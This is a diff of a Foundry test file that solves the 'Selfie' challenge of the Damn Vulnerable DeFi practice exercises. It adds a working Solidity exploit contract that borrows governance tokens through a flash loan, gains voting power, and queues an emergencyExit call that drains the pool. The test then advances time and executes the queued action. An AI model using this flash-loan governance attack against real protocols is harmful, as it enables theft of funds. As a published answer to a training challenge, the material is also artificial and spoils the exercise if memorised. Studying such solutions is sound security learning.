@@ -6,6 +6,56 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+
+
+
+contract Attack is IERC3156FlashBorrower{
+
+    SimpleGovernance governance;
+    SelfiePool pool;
+    address payable public receiver;
+
+    constructor(SelfiePool _pool, address payable _receiver, SimpleGovernance _governance){
+        pool = _pool;
+        receiver = _receiver;
+        governance = _governance;
+
+    }
+    
+    function attack() external {
+       // Request a flash loan for the maximum amount of tokens in the pool
+        pool.flashLoan(this,governance.getVotingToken(),pool.maxFlashLoan(governance.getVotingToken()), bytes(""));        
+    }
+
+
+    function onFlashLoan(
+            address initiator,
+            address token,
+            uint256 amount,
+            uint256 fee,
+            bytes calldata data
+        ) external  override returns (bytes32) {
+        
+            // Take a snapshot to have voting power
+            DamnValuableVotes(token).delegate(address(this));
+
+            // Queue the action to drain all funds to the recovery address
+            governance.queueAction(address(pool),0, abi.encodeCall(pool.emergencyExit,(receiver)));
+
+            // Approve the pool to pull the owed amount
+            DamnValuableVotes(token).approve(address(pool), amount + fee);
+
+            return keccak256("ERC3156FlashBorrower.onFlashLoan");
+        }
+
+    // Fallback to receive ETH
+   receive() external payable {
+        console.log("payed");
+   }
+
+}
+
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -58,10 +108,24 @@ contract SelfieChallenge is Test {
         assertEq(pool.flashFee(address(token), 0), 0);
     }
 
-    /**
-     * CODE YOUR SOLUTION HERE
-     */
+    /*
+        The exploit takes advantage of the governance delay mechanism. 
+        By taking a flash loan and queuing an action to drain the pool's funds, the attacker can execute 
+        the action after the delay, even though they no longer have the necessary voting power. 
+    */
+
     function test_selfie() public checkSolvedByPlayer {
+ 
+        //Deploy the attack contract
+        Attack attack = new Attack(pool,payable(recovery), governance) ;
+        attack.attack();
+
+
+        // Advance time by 2 days to surpass governance delay
+        skip(2 days);
+
+        // Execute the queued action
+        governance.executeAction(1);
         
     }
 
